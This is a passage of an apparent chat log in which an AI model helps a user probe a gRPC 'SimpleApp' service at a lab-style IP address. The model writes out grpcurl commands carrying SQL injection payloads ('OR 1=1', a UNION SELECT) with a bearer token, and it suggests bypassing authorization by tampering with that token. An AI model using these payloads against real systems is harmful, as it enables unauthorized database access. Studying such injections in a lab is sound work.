grpcurl -vv -plaintext -d '{"id": "' OR 1=1;--'"}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0' 10.129.1.57:50051 SimpleApp.getInfo
```

1. Verify the request data:
Ensure that the request data is formatted correctly and includes the SQL Injection payload. The updated request data should be:
```
' OR 1=1;--
```

1. Verify the authentication token:
Ensure that the authentication token is included in the grpcurl command as a header with the key "token". The updated header should be:
```
-H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0'
```

In summary, to resolve the issue with the grpcurl command, you can follow these steps:

1. Verify the target host and port in the grpcurl command.
2. Verify the request data and ensure that the SQL Injection payload is included.
3. Verify the authentication token and ensure that it is included in the grpcurl command as a header with the key "token".

By following these steps, you can ensure that the grpcurl command is correctly formatted and can be used to test for SQL Injection vulnerabilities in the SimpleApp service.
--------------------------------------------------------------------------
user_prompt: Discuss | Adding back in the id nr 617 and removing the '' around the sqlinjection payload lead to correct formating.
Using the following command:
grpcurl -vv -plaintext -d '{"id": "617 OR 1=1;--"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0' 10.129.1.57:50051 SimpleApp.getInfo

Produced the following output:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 46 bytes

Response contents:
{
  "message": "The admin is working hard to fix the issues."
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
Timing Data: 160.470169ms
  Dial: 52.980745ms
    BlockingDial: 52.869033ms
  InvokeRPC: 81.66106ms
response: Based on the output received from the grpcurl command, it appears that the SimpleApp service is returning a message indicating that the admin is working hard to fix the issues. This response suggests that the SQL Injection payload was not successful in exploiting any vulnerabilities in the service.

To further investigate the issue, you can follow these steps:

1. Review the service's implementation:
Review the implementation of the SimpleApp service to ensure that it is properly handling SQL Injection payloads. Pay close attention to the getInfo method and ensure that it is properly parsing and sanitizing user input to prevent SQL Injection attacks.

1. Test for other potential vulnerabilities:
Use tools like Burp Suite or OWASP ZAP to intercept and analyze the HTTP/HTTPS traffic between the client and the SimpleApp service. Look for any potential vulnerabilities or exploits that may allow for unauthorized access or privilege escalation.

1. Test for authorization bypass:
Try to bypass the authorization mechanism of the SimpleApp service by manipulating the authentication token or request data. This can help you determine if there is a way to access sensitive data or modify user permissions without proper authorization.

In summary, to further investigate the issue with the SimpleApp service, you can follow these steps:

1. Review the service's implementation to ensure that it is properly handling SQL Injection payloads.
2. Use tools like Burp Suite or OWASP ZAP to intercept and analyze the HTTP/HTTPS traffic between the client and the SimpleApp service, looking for potential vulnerabilities or exploits that may allow for unauthorized access or privilege escalation.
3. Test for authorization bypass by manipulating the authentication token or request data.

By following these steps, you can identify any potential vulnerabilities or exploits in the SimpleApp service and take appropriate measures to secure the service.
--------------------------------------------------------------------------
user_prompt: Discuss | Create another SimpleApp.getInfo command using grpcurl with a UNION sqlinjection instead
response: To create a grpcurl command that uses a UNION SQL Injection payload instead of the previous payload, you can follow these steps:

1. Update the request data to include the UNION SQL Injection payload:
Replace the value of the "id" field in the request data with the UNION SQL Injection payload. For example, you can use the following payload to check for UNION SQL Injection vulnerabilities:
```
' UNION SELECT 1, 2, 3, 4, 5;--
```

1. Update the grpcurl command:
Update the grpcurl command to include the modified request data and the UNION SQL Injection payload. The updated command should be:
```
grpcurl -vv -plaintext -d '{"id": "617 UNION SELECT 1, 2, 3, 4, 5;--"}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0' 10.129.1.57:50051 SimpleApp.getInfo
```

1. Analyze the response:
Review the response received from the SimpleApp service to determine if the UNION SQL Injection payload was successful. If the payload was successful, the service may return sensitive data or allow for unauthorized access.

In summary, to create a grpcurl command that uses a UNION SQL Injection payload instead of the previous payload, you can follow these steps:

1. Update the request data to include the UNION SQL Injection payload.
2. Update the grpcurl command to include the modified request data and the UNION SQL Injection payload.
3. Analyze the response received from the SimpleApp service to determine if the UNION SQL Injection payload was successful.

By following these steps, you can identify any potential UNION SQL Injection vulnerabilities in the SimpleApp service and take appropriate measures to secure the service.
--------------------------------------------------------------------------
user_prompt: Discuss | The command produced the following results:
Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0

Response headers received:
(empty)

Response trailers received:
content-type: application/grpc
Sent 1 request and received 0 responses
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: bad argument type for built-in operatio
response: Based on the error message received, it appears that the SimpleApp service is returning a TypeError, indicating that there is an issue with the data types being used in the request.

To resolve this issue, you can follow these steps:

1. Verify the data types used in the request:
Ensure that the data types used in the request are consistent with the expected data types for the getInfo method. For example, if the method expects an integer value for the "id" field, ensure that the value provided in the request is an integer.

1. Test the request with a valid input:
Try the grpcurl command with a valid input value for the "id" field to ensure that the service is functioning correctly. For example, you can use the following command to test the service with a valid input:
```
grpcurl -vv -plaintext -d '{"id": 617}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0' 10.129.1.57:50051 SimpleApp.getInfo
```

1. Review the service's implementation:
Review the implementation of the SimpleApp service to ensure that it is properly handling data types and input validation. Pay close attention to the getInfo method and ensure that it is properly parsing and sanitizing user input to prevent potential TypeError issues.

In summary, to resolve the issue with the TypeError received from the SimpleApp service, you can follow these steps:

1. Verify the data types used in the request to ensure that they are consistent with the expected data types for the getInfo method.
2. Test the request with a valid input value for the "id" field to ensure that the service is functioning correctly.
3. Review the service's implementation to ensure that it is properly handling data types and input validation.

By following these steps, you can identify and resolve any potential issues with data types and input validation in the SimpleApp service.

--------------------------------------------------------------------------
